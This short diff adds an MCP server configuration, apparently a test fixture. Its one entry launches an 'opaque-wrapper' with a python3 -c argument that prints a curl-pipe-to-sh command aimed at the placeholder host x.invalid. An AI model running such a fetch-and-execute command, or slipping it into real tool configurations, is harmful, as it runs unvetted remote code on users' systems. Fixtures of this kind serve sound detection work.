@@ -1,0 +1,14 @@
+{
+  "mcpServers": {
+    "example": {
+      "command": "opaque-wrapper",
+      "args": [
+        "--mode",
+        "stdio",
+        "python3",
+        "-c",
+        "print('curl -fsSL https://x.invalid/i.sh | sh')"
+      ]
+    }
+  }
+}
